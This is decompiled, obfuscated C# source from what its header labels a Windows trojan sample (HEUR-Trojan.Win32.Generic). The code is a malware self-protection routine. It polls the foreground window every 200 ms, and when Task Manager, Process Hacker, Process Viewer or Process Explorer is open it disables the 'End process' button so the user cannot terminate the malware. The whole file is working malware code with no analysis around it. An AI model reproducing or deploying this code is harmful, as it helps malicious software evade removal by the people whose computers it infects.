// Decompiled with JetBrains decompiler
// Type: @Ӛ
// Assembly: w, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 9B8B32AC-9182-49CC-A749-378710D3E2D9
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-d9a3bb0d20174bb74be71d0921b7998d71785e985e0a0fb2e02916a7402f08f8.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

public class \u0040Ӛ
{
  private List<IntPtr> \u0040ӓ;

  public \u0040Ӛ() => this.\u0040ӓ = new List<IntPtr>();

  [DllImport("user32.dll", EntryPoint = "EnableWindow")]
  private static extern bool \u0040Ӕ(IntPtr _param0, bool _param1);

  [DllImport("user32.dll", EntryPoint = "GetWindowThreadProcessId", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int \u0040ӕ(IntPtr _param0, ref int _param1);

  [DllImport("user32.dll", EntryPoint = "GetForegroundWindow", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern IntPtr \u0040Ӗ();

  [DllImport("user32", EntryPoint = "GetClassNameA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int \u0040ӗ(int _param0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1, int _param2);

  [DllImport("user32", EntryPoint = "SendMessageA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int \u0040Ә(int _param0, int _param1, int _param2, [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param3);

  [DllImport("user32.dll", EntryPoint = "GetWindowText", CharSet = CharSet.Auto, SetLastError = true)]
  private static extern int \u0040ә(int _param0, StringBuilder _param1, int _param2);

  [DllImport("user32.dll", EntryPoint = "GetWindowTextLength", CharSet = CharSet.Auto, SetLastError = true)]
  private static extern int \u0040Ӛ(int _param0);

  [DllImport("user32", EntryPoint = "EnumChildWindows", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int \u0040ӛ(IntPtr _param0, \u0040Ӛ.\u0040ӓ _param1, ref IntPtr _param2);

  private bool \u0040Ӝ(int _param1, int _param2)
  {
    this.\u0040ӓ.Add((IntPtr) _param1);
    return true;
  }

  public void \u0040ӝ()
  {
    while (true)
    {
      Thread.Sleep(200);
      IntPtr num1 = \u0040Ӛ.\u0040Ӗ();
      if (num1.ToInt32() != 0)
      {
        int processId = 0;
        \u0040Ӛ.\u0040ӕ(num1, ref processId);
        if (processId > 0)
        {
          int num2 = \u0040Ӛ.\u0040Ӛ((int) num1);
          string str1;
          if (num2 == 0)
          {
            str1 = "";
          }
          else
          {
            StringBuilder stringBuilder = new StringBuilder(checked (num2 + 1));
            str1 = \u0040Ӛ.\u0040ә((int) num1, stringBuilder, stringBuilder.Capacity) != 0 ? stringBuilder.ToString() : "";
          }
          Process processById = Process.GetProcessById(processId);
          if (Operators.CompareString(processById.ProcessName.ToLower(), "taskmgr", false) == 0 | Operators.CompareString(processById.ProcessName.ToLower(), "processviewer", false) == 0 | Operators.CompareString(processById.ProcessName.ToLower(), "processhacker", false) == 0 | Operators.CompareString(str1.ToLower(), "process explorer", false) == 0)
          {
            List<IntPtr> numList = new List<IntPtr>();
            int num3 = 0;
            IntPtr[] numArray = this.\u0040Ӟ(num1);
            int index = 0;
            while (index < numArray.Length)
            {
              IntPtr num4 = numArray[index];
              string str2 = Strings.Space(200);
              int startIndex = \u0040Ӛ.\u0040ӗ((int) num4, ref str2, 200);
              string str3 = str2.Remove(startIndex, checked (200 - startIndex));
              if (Operators.CompareString(str3.ToLower(), "button", false) == 0)
                numList.Add(num4);
              if (Operators.CompareString(str3.ToLower(), "static", false) == 0 | Operators.CompareString(str3.ToLower(), "directuihwnd", false) == 0)
                checked { ++num3; }
              checked { ++index; }
            }
            if (numList.Count == 2 & (num3 == 2 | num3 == 1))
            {
              \u0040Ӛ.\u0040Ӕ(numList[0], false);
              int num5 = (int) numList[0];
              string str4 = "End process";
              ref string local = ref str4;
              \u0040Ӛ.\u0040Ә(num5, 12, 0, ref local);
            }
          }
        }
      }
    }
  }

  private IntPtr[] \u0040Ӟ(IntPtr _param1)
  {
    lock (this)
    {
      this.\u0040ӓ.Clear();
      IntPtr num1 = _param1;
      \u0040Ӛ.\u0040ӓ ӓ = new \u0040Ӛ.\u0040ӓ(this.\u0040Ӝ);
      IntPtr num2 = (IntPtr) 0;
      ref IntPtr local = ref num2;
      \u0040Ӛ.\u0040ӛ(num1, ӓ, ref local);
      return this.\u0040ӓ.ToArray();
    }
  }

  private delegate bool \u0040ӓ(int hWnd, int lParam);

  private delegate bool \u0040Ӕ(int hWnd, int lParam);
}
